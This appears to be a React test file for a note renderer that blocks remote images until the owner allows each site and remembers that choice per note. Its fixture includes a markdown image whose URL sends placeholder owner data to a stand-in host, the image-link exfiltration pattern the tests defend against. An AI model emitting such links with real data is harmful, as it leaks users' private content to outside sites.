import { afterEach, expect, test } from "bun:test";
import { act } from "react";
import { createRoot, type Root } from "react-dom/client";
import { installDom } from "@/test/dom";
import { NoteRenderer } from "./NoteRenderer";

let restore: (() => void) | undefined;
const mounted = new Set<{ root: Root; host: HTMLElement }>();
afterEach(async () => {
  for (const { root, host } of mounted) { await act(async () => root.unmount()); host.remove(); }
  mounted.clear();
  restore?.();
  restore = undefined;
});

async function render(md: string, noteId?: string) {
  restore ??= installDom();
  const host = document.createElement("div");
  document.body.append(host);
  const root = createRoot(host);
  mounted.add({ root, host });
  await act(async () => root.render(<NoteRenderer md={md} noteId={noteId} />));
  for (let i = 0; i < 200 && !host.querySelector(".fmd"); i++) await act(async () => { await new Promise((resolve) => setTimeout(resolve, 25)); });
  expect(host.querySelector(".fmd")).not.toBeNull();
  return host;
}

const NOTE = "Summary\n\n![chart](https://one.example/leak?d=FAKE-OWNER-DATA-1234)\n\n![other](https://two.example/o.png)";
const allowFor = (host: HTMLElement, site: string) =>
  [...host.querySelectorAll<HTMLElement>(".nt-fmd-images")].find((row) => row.textContent?.includes(`Load images from ${site}?`))?.querySelector("button");

test("a note loads no image until the owner allows that site, then only that site's", async () => {
  const host = await render(NOTE, "note-1");
  expect(host.querySelectorAll("img, [src], [srcset]")).toHaveLength(0);
  expect(host.textContent).toContain("Load images from one.example?");
  expect(host.textContent).toContain("Load images from two.example?");
  await act(async () => { allowFor(host, "one.example")!.click(); });
  const images = [...host.querySelectorAll("img")];
  expect(images.map((image) => image.getAttribute("src"))).toEqual(["https://one.example/leak?d=FAKE-OWNER-DATA-1234"]);
  expect(host.textContent).not.toContain("Load images from one.example?");
  expect(host.textContent).toContain("Load images from two.example?");
  expect(host.textContent).toContain("Image not loaded: other (two.example)");
});

test("the choice is remembered for that note and for no other", async () => {
  const first = await render(NOTE, "note-remember");
  await act(async () => { allowFor(first, "one.example")!.click(); });
  expect(first.querySelectorAll("img")).toHaveLength(1);
  const again = await render(NOTE, "note-remember");
  expect(again.querySelectorAll("img")).toHaveLength(1);
  const other = await render(NOTE, "note-other");
  expect(other.querySelectorAll("img")).toHaveLength(0);
  expect(other.textContent).toContain("Load images from one.example?");
});

test("the held-back line says who will see it and what the addresses can hold, and is read aloud as written", async () => {
  const host = await render(NOTE, "note-words");
  const row = host.querySelector<HTMLElement>(".nt-fmd-images")!;
  const line = "Load images from one.example? That site will see that you opened this note, and the image addresses can include text from the note.";
  expect(row.querySelector("span")!.textContent).toBe(line);
  expect(row.getAttribute("aria-label")).toBe(line);
  expect(row.querySelector("button")!.textContent?.trim()).toBe("Allow");
});
